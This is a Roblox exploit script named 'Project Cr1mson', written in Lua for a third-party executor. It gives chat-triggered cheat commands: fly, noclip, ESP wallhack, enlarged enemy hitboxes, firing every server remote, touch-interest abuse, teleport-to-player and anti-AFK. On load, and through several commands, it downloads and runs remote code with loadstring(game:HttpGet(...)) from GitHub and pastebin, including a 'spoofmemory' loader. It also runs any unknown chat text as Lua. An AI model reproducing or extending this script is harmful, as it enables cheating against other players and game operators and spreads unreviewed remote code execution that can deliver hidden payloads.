if not _G.CR1MSON_LOADED then _G.CR1MSON_LOADED=true
if typeof(task)~="table"or not task.wait then task={}task.wait=wait task.spawn=function(f)coroutine.wrap(f)()end end
local Players=game:GetService("Players")
local LocalPlayer=Players.LocalPlayer
local StarterGui=game:GetService("StarterGui")
local Lighting=game:GetService("Lighting")
local RunService=game:GetService("RunService")
local TeleportService=game:GetService("TeleportService")
local HttpService=game:GetService("HttpService")
local cr1mFlyStates={wasdfly={active=false,bg=nil,bv=nil,conn1=nil,conn2=nil},mfly={active=false,bv=nil,bg=nil,renderConn=nil}}
local function cr1mFetch(url)
local s,r=pcall(function()return game:HttpGet(url)end)
if s and r then pcall(function()loadstring(r)()end)end
end
getgenv().Cr1msonESP=function()
local function createESP(plr)
local billboard=Instance.new("BillboardGui")
billboard.Name="ESP"
billboard.Adornee=plr.Character:FindFirstChild("Head")or plr.Character:FindFirstChildOfClass("Part")
billboard.AlwaysOnTop=true
billboard.Size=UDim2.new(0,100,0,40)
local txt=Instance.new("TextLabel",billboard)
txt.Text=plr.Name
txt.Size=UDim2.new(1,0,1,0)
txt.BackgroundTransparency=1
txt.TextColor3=Color3.new(1,0,0)
if plr.Character and billboard.Adornee then billboard.Parent=plr.Character end
end
for _,plr in pairs(Players:GetPlayers())do
if plr~=LocalPlayer and plr.Character and not plr.Character:FindFirstChild("ESP")then
pcall(function()createESP(plr)end)
end
end
Players.PlayerAdded:Connect(function(plr)
plr.CharacterAdded:Connect(function()
task.wait(1)
if not plr.Character:FindFirstChild("ESP")then pcall(function()createESP(plr)end)end
end)
end)
end
getgenv().unCr1msonESP=function()
for _,plr in pairs(Players:GetPlayers())do
if plr.Character and plr.Character:FindFirstChild("ESP")then plr.Character.ESP:Destroy()end
end
end
local TweenService=game:GetService("TweenService")
local UIS=game:GetService("UserInputService")
local function runCommand(txt)
if txt==""then return end
local args={}for word in txt:gmatch("%S+")do table.insert(args,word)end
local cmd=args[1]and args[1]:lower()or""
if cmd=="fly"then
if cr1mFlyStates.fly and cr1mFlyStates.fly.active then return end
local state={active=true,bg=nil,bv=nil,renderConn=nil,conn1=nil,conn2=nil}
cr1mFlyStates.fly=state
local SPEED=1
local lp=Players.LocalPlayer
local cam=workspace.CurrentCamera
local root=lp.Character and (lp.Character:FindFirstChild("HumanoidRootPart")or lp.Character:FindFirstChild("UpperTorso")or lp.Character:FindFirstChild("Torso"))
if not root then repeat task.wait()until lp.Character and (lp.Character:FindFirstChild("HumanoidRootPart")or lp.Character:FindFirstChild("UpperTorso")or lp.Character:FindFirstChild("Torso"))root=lp.Character:FindFirstChild("HumanoidRootPart")or lp.Character:FindFirstChild("UpperTorso")or lp.Character:FindFirstChild("Torso")end
state.bg=Instance.new("BodyGyro",root)
state.bg.P=9e4
state.bg.MaxTorque=Vector3.new(9e9,9e9,9e9)
state.bg.CFrame=root.CFrame
state.bv=Instance.new("BodyVelocity",root)
state.bv.Velocity=Vector3.zero
state.bv.MaxForce=Vector3.new(9e9,9e9,9e9)
local control={F=0,B=0,L=0,R=0,Q=0,E=0}
state.conn1=UIS.InputBegan:Connect(function(input,gpe)
if gpe then return end
if input.KeyCode==Enum.KeyCode.W then control.F=SPEED end
if input.KeyCode==Enum.KeyCode.S then control.B=-SPEED end
if input.KeyCode==Enum.KeyCode.A then control.L=-SPEED end
if input.KeyCode==Enum.KeyCode.D then control.R=SPEED end
if input.KeyCode==Enum.KeyCode.Q then control.E=-SPEED*2 end
if input.KeyCode==Enum.KeyCode.E then control.Q=SPEED*2 end
end)
state.conn2=UIS.InputEnded:Connect(function(input)
if input.KeyCode==Enum.KeyCode.W then control.F=0 end
if input.KeyCode==Enum.KeyCode.S then control.B=0 end
if input.KeyCode==Enum.KeyCode.A then control.L=0 end
if input.KeyCode==Enum.KeyCode.D then control.R=0 end
if input.KeyCode==Enum.KeyCode.Q then control.E=0 end
if input.KeyCode==Enum.KeyCode.E then control.Q=0 end
end)
local ctrlMod
pcall(function()
ctrlMod=require(lp.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
end)
state.renderConn=RunService.RenderStepped:Connect(function()
if not state.active then return end
local moveVec=Vector3.zero
if ctrlMod then moveVec=ctrlMod:GetMoveVector()end
local joyDir=Vector3.zero
if moveVec.Magnitude>0 then joyDir=cam.CFrame.RightVector*moveVec.X+cam.CFrame.LookVector*-moveVec.Z end
local keyDir=Vector3.zero
keyDir=keyDir+cam.CFrame.LookVector*(control.F+control.B)
keyDir=keyDir+cam.CFrame.RightVector*(control.L+control.R)
keyDir=keyDir+cam.CFrame.UpVector*((control.Q+control.E)*0.5)
local dir=joyDir+keyDir
local mag=dir.Magnitude
local flySpeed=(mag>0)and 50 or 0
if mag>0 then dir=dir.Unit end
state.bv.Velocity=dir*flySpeed
state.bg.CFrame=cam.CFrame
local hum=lp.Character and lp.Character:FindFirstChildOfClass("Humanoid")
if hum then hum.PlatformStand=state.active end
end)
elseif cmd=="unfly"then
local state=cr1mFlyStates.fly
if state and state.active then
state.active=false
if state.bv then state.bv:Destroy()state.bv=nil end
if state.bg then state.bg:Destroy()state.bg=nil end
if state.renderConn then state.renderConn:Disconnect()state.renderConn=nil end
if state.conn1 then state.conn1:Disconnect()state.conn1=nil end
if state.conn2 then state.conn2:Disconnect()state.conn2=nil end
local hum=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
if hum then hum.PlatformStand=false end
end
elseif cmd=="lay"then
local layPlr=Players.LocalPlayer
local layChar=layPlr.Character or layPlr.CharacterAdded:Wait()
local layHum=layChar:WaitForChild("Humanoid")
local layHrp=layChar:WaitForChild("HumanoidRootPart")
local laying=true
local layResult=workspace:Raycast(layHrp.Position,Vector3.new(0,-20,0),RaycastParams.new())
if layResult then
local groundY=layResult.Position.Y
local hrpY=layHrp.Size.Y/2
layHrp.CFrame=CFrame.new(layHrp.Position.X,groundY+hrpY+0.05,layHrp.Position.Z)*CFrame.Angles(math.rad(90),0,0)
end
layHum.PlatformStand=true
game:GetService("UserInputService").InputBegan:Connect(function(input,gpe)
if laying and not gpe and (input.UserInputType==Enum.UserInputType.Touch or input.KeyCode==Enum.KeyCode.Space)then laying=false end end)
task.spawn(function()
while laying do if not layHum.PlatformStand then layHum.PlatformStand=true end task.wait()end
layHum.PlatformStand=false end)
elseif cmd=="speed"then
local spdVal=tonumber(args[2])
if spdVal then
spdVal=math.clamp(spdVal,1,1000)
local spdChar=LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local spdHum=spdChar:FindFirstChildOfClass("Humanoid")
if spdHum then spdHum.WalkSpeed=spdVal end
end
elseif cmd=="remotespy"then cr1mFetch("https://raw.githubusercontent.com/78n/SimpleSpy/refs/heads/main/SimpleSpySource.lua")
elseif cmd=="dex"then cr1mFetch("https://raw.githubusercontent.com/peyton2465/Dex/master/out.lua")
elseif cmd=="chatadmin"then cr1mFetch("https://pastefy.app/H6k8QmIp/raw")
elseif cmd=="reset"then
local rstChar=LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
rstChar:BreakJoints()
elseif cmd=="rejoin"then TeleportService:TeleportToPlaceInstance(game.PlaceId,game.JobId,LocalPlayer)
elseif cmd=="serverhop"then
local cr1mSrv=game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?limit=100")
for _,v in pairs(HttpService:JSONDecode(cr1mSrv).data)do
if v.playing<v.maxPlayers and v.id~=game.JobId then
TeleportService:TeleportToPlaceInstance(game.PlaceId,v.id,LocalPlayer)
break end end
elseif cmd=="goto"then
local tgtName=args[2]
if tgtName then
local function findTgt(name)
name=name:lower()
for _,p in ipairs(Players:GetPlayers())do
if p~=LocalPlayer then
local uname=p.Name:lower()
local dname=p.DisplayName:lower()
if uname:find(name)or dname:find(name)then return p end end end
return nil
end
local tgt=findTgt(tgtName)
if tgt and tgt.Character and tgt.Character:FindFirstChild("HumanoidRootPart")then
local hrp=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
if hrp then hrp.CFrame=tgt.Character.HumanoidRootPart.CFrame+Vector3.new(0,3,0)end end end

elseif cmd=="antifling"then
local afChar=LocalPlayer.Character
if afChar then
for _,v in pairs(afChar:GetDescendants())do
if v:IsA("BasePart")and v.Name~="HumanoidRootPart"then v.CustomPhysicalProperties=PhysicalProperties.new(0,0,0)end end
end
elseif cmd=="unantifling"then
local uafChar=LocalPlayer.Character
if uafChar then
for _,v in pairs(uafChar:GetDescendants())do
if v:IsA("BasePart")and v.Name~="HumanoidRootPart"then v.CustomPhysicalProperties=PhysicalProperties.new(1,0.3,0.5)end end
end
elseif cmd=="sit"then
local sitPlr=Players.LocalPlayer
local sitChar=sitPlr.Character or sitPlr.CharacterAdded:Wait()
local sitHum=sitChar:WaitForChild("Humanoid")
sitHum.Sit=true
local sitting=true
sitHum.StateChanged:Connect(function(_,new)
if sitting and new==Enum.HumanoidStateType.Jumping then sitting=false end end)
task.spawn(function()
while sitting and sitHum and sitHum.Parent do
if not sitHum.Sit then sitHum.Sit=true end task.wait(0.1)end end)
elseif cmd=="leave"then Players.LocalPlayer:Kick("Cr1m Face has kicked you.")
elseif cmd=="godmode"then
local gmChar=LocalPlayer.Character
if gmChar then
for _,v in pairs(gmChar:GetDescendants())do
if v:IsA("BasePart")then v.Anchored=false v.CanCollide=true v.Massless=false end end
gmChar:BreakJoints()
end
elseif cmd=="fireremotes"then
local remotesList={}
for _,obj in ipairs(game:GetDescendants())do
if obj:IsA("RemoteEvent")or obj:IsA("RemoteFunction")then table.insert(remotesList,obj)end end
for _,remote in ipairs(remotesList)do
pcall(function()
if remote:IsA("RemoteEvent")then remote:FireServer()elseif remote:IsA("RemoteFunction")then remote:InvokeServer()end end)end
elseif cmd=="firetouchinterests"then
local ftChar=LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local ftHrp=ftChar and ftChar:FindFirstChild("HumanoidRootPart")
if ftHrp and firetouchinterest then
for _,part in ipairs(workspace:GetDescendants())do
if part:IsA("BasePart")and part:FindFirstChildWhichIsA("TouchTransmitter")then
firetouchinterest(ftHrp,part,0)
firetouchinterest(ftHrp,part,1)end end end
elseif cmd=="hitbox"then
local size=tonumber(args[2])or 10
for _,player in ipairs(Players:GetPlayers())do
if player~=LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart")then
local hrp=player.Character.HumanoidRootPart
hrp.Size=Vector3.new(size,size,size)
hrp.Transparency=0.7
hrp.BrickColor=BrickColor.new("Really red")
hrp.Material=Enum.Material.Neon
hrp.CanCollide=false end end
elseif cmd=="noclip"then
local cr1mNoclip=true
RunService.Stepped:Connect(function()
if cr1mNoclip and LocalPlayer.Character then
for _,v in pairs(LocalPlayer.Character:GetDescendants())do
if v:IsA("BasePart")then v.CanCollide=false end end end end)
elseif cmd=="clip"then
if LocalPlayer.Character then
for _,v in pairs(LocalPlayer.Character:GetDescendants())do
if v:IsA("BasePart")then v.CanCollide=true end end end
elseif cmd=="spin"then
local spd=tonumber(args[2])or 10
local spinChar=LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local spinHrp=spinChar:FindFirstChild("HumanoidRootPart")
if spinHrp then spawn(function()
while wait()do spinHrp.CFrame=spinHrp.CFrame*CFrame.Angles(0,math.rad(spd),0)end end)end
elseif cmd=="view"then
local viewName=args[2]
for _,p in ipairs(Players:GetPlayers())do
if p~=LocalPlayer and p.Name:lower():find(viewName:lower())then
workspace.CurrentCamera.CameraSubject=p.Character and p.Character:FindFirstChild("Humanoid")end end
elseif cmd=="fixcam"then workspace.CurrentCamera.CameraSubject=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
elseif cmd=="fullbright"then Lighting.Brightness=10 Lighting.ClockTime=12 Lighting.FogEnd=1e10 Lighting.GlobalShadows=false Lighting.OutdoorAmbient=Color3.new(1,1,1)
elseif cmd=="unfullbright"then Lighting.Brightness=2 Lighting.ClockTime=14 Lighting.FogEnd=1000 Lighting.GlobalShadows=true Lighting.OutdoorAmbient=Color3.fromRGB(128,128,128)
elseif cmd=="esp"then getgenv().Cr1msonESP()
elseif cmd=="unesp"then getgenv().unCr1msonESP()
elseif cmd=="antiafk"then for _,v in pairs(getconnections(Players.LocalPlayer.Idled))do v:Disable()end
else
local s,f=pcall(function()return loadstring(txt)end)
if s and typeof(f)=="function"then pcall(f)end end end
Players.LocalPlayer.Chatted:Connect(function(msg)if msg:sub(1,1)==";"then runCommand(msg:sub(2))end end)
pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Dhelann/Project-Cr1mson/refs/heads/main/loader.lua"))()end)
pcall(function()loadstring(game:HttpGet("https://pastebin.com/raw/xpyxZ5fd"))()end)
pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Dhelann/Project-Cr1mson/refs/heads/main/spoofmemory.lua"))()end)
end
